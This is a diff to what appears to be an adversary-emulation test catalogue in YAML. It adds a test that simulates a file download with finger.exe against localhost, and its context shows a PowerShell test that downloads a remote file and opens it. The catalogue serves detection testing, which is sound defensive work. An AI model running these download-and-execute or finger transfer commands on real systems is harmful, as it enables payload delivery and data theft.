@@ -65396,6 +65396,25 @@ command-and-control:
         command: "(New-Object Net.WebClient).DownloadString('#{target_remote_file}')
           | Out-File #{output_file}; Invoke-Item #{output_file}\n"
         name: powershell
+    - name: File download with finger.exe on Windows
+      auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
+      description: |
+        Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
+        Because this is being tested on the localhost, you should not be expecting a successful connection
+        https://www.exploit-db.com/exploits/48815
+        https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_host:
+          description: Remote hostname or IP address
+          type: String
+          default: localhost
+      executor:
+        name: command_prompt
+        command: 'finger base64_filedata@#{remote_host}
+
+'
   T1090.001:
     technique:
       external_references:
